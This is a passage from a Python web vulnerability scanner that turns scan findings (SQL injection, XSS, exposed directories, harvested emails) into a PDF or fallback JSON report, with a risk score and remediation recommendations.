        ["SQL Injection", str(len(sql_findings)), "HIGH" if len(sql_findings) > 0 else "NONE"],
        ["XSS", str(len(xss_findings)), "HIGH" if len(xss_findings) > 0 else "NONE"],
        ["Admin Access", str(len(admin_findings)), "HIGH" if len(admin_findings) > 0 else "NONE"],
        ["WordPress Paths", str(len(wp_findings)), "MEDIUM" if len(wp_findings) > 20 else "LOW"],
        ["Exposed Directories", str(len(found_directories)), "MEDIUM" if len(found_directories) > 50 else "LOW"],
        ["Email Addresses", str(len(emails)), "MEDIUM" if len(emails) > 0 else "NONE"],
        ["Subdomains", str(len(subdomains)), "LOW" if len(subdomains) > 1 else "NONE"]
    ]
    
    table = Table(findings_data)
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    story.append(table)
    story.append(Spacer(1, 20))
    
    # Next Steps
    story.append(Paragraph("🎯 IMMEDIATE NEXT STEPS", styles['Heading2']))
    story.append(Spacer(1, 12))
    
    next_steps = [
        "1. **IMMEDIATE ACTION REQUIRED**: Fix open redirect vulnerabilities",
        "2. **IMMEDIATE ACTION REQUIRED**: Fix file inclusion vulnerabilities", 
        "3. **HIGH PRIORITY**: Secure WordPress admin areas",
        "4. **HIGH PRIORITY**: Implement input validation on all parameters",
        "5. **MEDIUM PRIORITY**: Remove or secure exposed directories",
        "6. **MEDIUM PRIORITY**: Implement security headers",
        "7. **ONGOING**: Schedule regular security assessments",
        "8. **ONGOING**: Monitor for new vulnerabilities"
    ]
    
    for step in next_steps:
        story.append(Paragraph(step, styles['Normal']))
        story.append(Spacer(1, 6))
    
    # Build PDF
    doc.build(story)
    
    print(f"   ✅ Report generated: {filename}")
    return filename

# Generate the report
try:
    report_file = generate_security_report()
    
    # Calculate risk level for summary
    risk_score = 0
    if len(redirect_findings) > 0: risk_score += 3
    if len(lfi_findings) > 0: risk_score += 5
    if len(sql_findings) > 0: risk_score += 4
    if len(xss_findings) > 0: risk_score += 3
    if len(admin_findings) > 0: risk_score += 4
    if len(backup_findings) > 0: risk_score += 2
    if len(info_disclosure) > 0: risk_score += 2
    if len(wp_findings) > 20: risk_score += 2
    
    if risk_score >= 15:
        risk_level = "CRITICAL"
    elif risk_score >= 10:
        risk_level = "HIGH"
    elif risk_score >= 5:
        risk_level = "MEDIUM"
    else:
        risk_level = "LOW"
    
    print(f"\n🎯 COMPREHENSIVE SECURITY REPORT GENERATED!")
    print(f"📄 File: {report_file}")
    print(f"📊 Risk Level: {risk_level}")
    print(f"🚨 Critical Issues: {len(redirect_findings) + len(lfi_findings)}")
    print(f"⚠️ High Severity: {len(sql_findings) + len(xss_findings) + len(admin_findings)}")
    print(f"📧 Information Disclosure: {len(emails)} emails found")
    print(f"🏗️ Infrastructure: {len(found_directories)} exposed directories")
    
    print(f"\n💡 RECOMMENDATIONS:")
    print(f"   • IMMEDIATE: Fix open redirect and file inclusion vulnerabilities")
    print(f"   • HIGH: Secure WordPress installation and admin areas")
    print(f"   • MEDIUM: Implement WAF and security headers")
    print(f"   • ONGOING: Regular security audits and monitoring")
    
except Exception as e:
    print(f"   ❌ Error generating report: {e}")
    print("   📝 Generating JSON report instead...")
    
    # Calculate risk level for JSON report
    risk_score = 0
    if len(redirect_findings) > 0: risk_score += 3
    if len(lfi_findings) > 0: risk_score += 5
    if len(sql_findings) > 0: risk_score += 4
    if len(xss_findings) > 0: risk_score += 3
    if len(admin_findings) > 0: risk_score += 4
    if len(backup_findings) > 0: risk_score += 2
    if len(info_disclosure) > 0: risk_score += 2
    if len(wp_findings) > 20: risk_score += 2
    
    if risk_score >= 15:
        risk_level = "CRITICAL"
    elif risk_score >= 10:
        risk_level = "HIGH"
    elif risk_score >= 5:
        risk_level = "MEDIUM"
    else:
        risk_level = "LOW"
    
    # Fallback JSON report
    json_report = {
        "target": base_url,
        "scan_timestamp": scan_timestamp,
        "risk_level": risk_level,
        "findings": {
            "subdomains": list(subdomains),
            "api_endpoints": list(api_endpoints),
            "directories": list(found_directories),
            "wordpress_paths": list(wp_findings),
            "admin_findings": list(admin_findings),
            "backup_findings": list(backup_findings),
            "info_disclosure": list(info_disclosure),
            "sql_findings": list(sql_findings),
            "xss_findings": list(xss_findings),
            "redirect_findings": list(redirect_findings),
            "lfi_findings": list(lfi_findings),
            "jwt_findings": list(jwt_findings),
            "graphql_findings": list(graphql_findings),
            "rate_limit_findings": list(rate_limit_findings),
            "csrf_findings": list(csrf_findings),
            "emails": list(emails)
        },
        "recommendations": [
            "Fix open redirect vulnerabilities immediately",
            "Fix file inclusion vulnerabilities immediately", 
            "Secure WordPress admin areas",
            "Implement input validation",
            "Remove exposed directories",
            "Implement security headers",
            "Deploy WAF",
            "Regular security audits"
        ]
    }
    
    json_filename = f"security_scan_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_filename, 'w') as f:
        json.dump(json_report, f, indent=2)
    print(f"   ✅ JSON report generated: {json_filename}")

print(f"\n🔥 VULNERABILITY SCAN COMPLETED!")
print(f"🎯 Target: {base_url}")
print(f"📊 Total Attack Modules: 15")
print(f"🚨 Critical Vulnerabilities Found: {len(redirect_findings) + len(lfi_findings)}")
print(f"⚠️ High Severity Issues: {len(sql_findings) + len(xss_findings) + len(admin_findings)}")
print(f"📧 Information Disclosure: {len(emails)} emails")
print(f"🏗️ Infrastructure Exposure: {len(found_directories)} directories")
print(f"📄 Report Generated: {report_file if 'report_file' in locals() else 'JSON report'}")